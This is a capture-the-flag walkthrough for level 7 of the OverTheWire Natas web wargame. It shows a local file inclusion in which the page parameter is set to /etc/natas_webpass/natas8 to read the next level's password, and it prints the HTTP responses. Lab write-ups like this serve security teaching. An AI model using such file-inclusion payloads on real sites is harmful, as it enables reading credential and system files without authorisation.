# level 7

**Host**: http://natas7.natas.labs.overthewire.org
>natas7:bmg8SvU1LizuWjx3y7xkNE**********

When you visit the site, you get you get nothing except two links:

```
Home About
```

### Solution:

By inspecting the source code you find a comment that reveals the passwords location `/etc/natas_webpass/natas8`.

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 17:14:42 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1005
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

When you look at the url you see a query parameter `?page=about` what suggests a local file inclusion. When you add the password location to the page parameter `?page=/etc/natas_webpass/natas8` you get the password for natas8 in the response.

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 17:20:34 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1015
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9**********

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```